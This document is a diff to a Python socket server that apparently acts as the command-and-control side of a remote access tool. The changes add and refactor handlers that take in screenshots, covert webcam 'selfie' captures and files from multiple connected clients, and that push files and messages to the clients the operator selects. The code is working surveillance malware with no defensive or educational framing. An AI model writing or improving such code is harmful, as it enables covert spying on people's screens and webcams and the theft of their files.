@@ -36,47 +36,80 @@ def receive_screenshot(conn, filename, filesize):
     print(f"[+] Screenshot saved as {filename}")
 
 
+def recv_line(conn):
+
+    data = b""
+
+    while not data.endswith(b"\n"):
+
+        chunk = conn.recv(1)
+
+        if not chunk:
+            return None
+
+        data += chunk
+
+    return data.decode().strip()
 
 def receive_thread(conn, addr):
     while True:
         try:
-            data = conn.recv(1024).decode()
+            # HEADER RECEIVE
+            header = recv_line(conn)
 
-            if not data:
-                continue
+            if not header:
+                print(f"[-] {addr[0]} disconnected")
+                break
 
-            # SCREENSHOT HEADER detect
-            if data.startswith("SCREEN "):
-
-                parts = data.split()
-
+            # SCREEN
+            if header.startswith("SCREEN "):
+                parts = header.split()
                 filename = parts[1]
-
                 filesize = int(parts[2])
 
                 print(f"\nReceiving screenshot: {filename}")
 
                 receive_screenshot(conn, filename, filesize)
 
+                print("Screenshot received!")
                 continue
 
-            # FILE HEADER detect
-            if data.startswith("FILE "):
+            # SELFIE
+            elif header.startswith("SELFIE "):
 
-                parts = data.split()
+                parts = header.split()
 
                 filename = parts[1]
-
                 filesize = int(parts[2])
+
+                print(f"\n[WEBCAM IMAGE]")
+                print(f"Filename : {filename}")
+                print(f"Filesize : {filesize} bytes")
 
                 receive_screenshot(conn, filename, filesize)
 
+                print("[+] Selfie received successfully\n")
+
+            # FILE
+            elif header.startswith("FILE "):
+                parts = header.split()
+                filename = parts[1]
+                filesize = int(parts[2])
+
+                print(f"\nReceiving file: {filename}")
+
+                receive_screenshot(conn, filename, filesize)
+
+                print("File received!")
                 continue
 
-            print(f"\nClient [{addr[0]}]: {data}")
+            else:
+                print(f"\nClient [{addr[0]}]: {header}")
 
-        except:
-            print(f"\nClient {addr[0]} disconnected!\n")
+        except Exception as e:
+            print(f"\nClient {addr[0]} disconnected!")
+            print("Error:", e)
+
             conn.close()
 
             if (conn, addr) in clients:
@@ -84,77 +117,22 @@ def receive_thread(conn, addr):
 
             break
 
-def receive_selfie(conn, imgname, imgsize):
-
-    with open(imgname, "wb") as f:
-
-        received = 0
-
-        while received < imgsize:
-
-            chunk = conn.recv(min(1024, filesize - received))
-
-            if not chunk:
-                break
-
-            f.write(chunk)
-
-            received += len(chunk)
-
-    print(f"[+] Selfie saved as {filename}")
-
-def received_selfie(conn, addr):
-    while True:
-        try:
-            data = conn.recv(1024).decode()
-
-            if not data:
-                continue
-
-            # SCREENSHOT HEADER detect
-            if data.startswith("SELFIE "):
-
-                parts = data.split()
-
-                imgname = parts[1]
-
-                imgsize = int(parts[2])
-
-                print(f"\nReceiving selfie: {imgname}")
-
-                receive_selfie(conn, imgname, imgsize)
-
-                continue
-
-            # FILE HEADER detect
-            if data.startswith("SELFIE "):
-
-                parts = data.split()
-
-                imgname = parts[1]
-
-                imgsize = int(parts[2])
-
-                receive_selfie(conn, imgname, imgsize)
-
-                continue
-
-            print(f"\nClient [{addr[0]}]: {data}")
-
-        except:
-            print(f"\nClient {addr[0]} disconnected!\n")
-            conn.close()
-
-            if (conn, addr) in clients:
-                clients.remove((conn, addr))
-
-            break
 # 🔥 accept thread
 def accept_clients():
+
     while True:
+
         conn, addr = server.accept()
+
         clients.append((conn, addr))
+
         print(f"\nConnected with {addr[0]}")
+
+        threading.Thread(
+            target=receive_thread,
+            args=(conn, addr),
+            daemon=True
+        ).start()
 
 
 threading.Thread(target=accept_clients, daemon=True).start()
@@ -191,8 +169,7 @@ while True:
         continue
 
     # 🔥 start receive threads for selected (if not already running)
-    for conn, addr in selected:
-        threading.Thread(target=receive_thread, args=(conn, addr), daemon=True).start()
+    
 
     # 🔥 SEND LOOP
     while True:
@@ -226,7 +203,7 @@ while True:
 
         
                 for conn, addr in selected:
-                    conn.send(f"FILE {filename} {filesize}".encode())
+                    conn.sendall(f"FILE {filename} {filesize}\n".encode())
 
                 time.sleep(1)
 
@@ -237,7 +214,7 @@ while True:
                         if not chunk:
                             break
                         for conn, addr in selected:
-                            conn.send(chunk)
+                            conn.sendall(chunk)
 
                 print("File sent successfully!")
 
@@ -252,6 +229,6 @@ while True:
 
         for conn, addr in selected:
             try:
-                conn.send(msg.encode())
+                conn.sendall((msg + "\n").encode())
             except:
                 print(f"Failed to send to {addr[0]}")
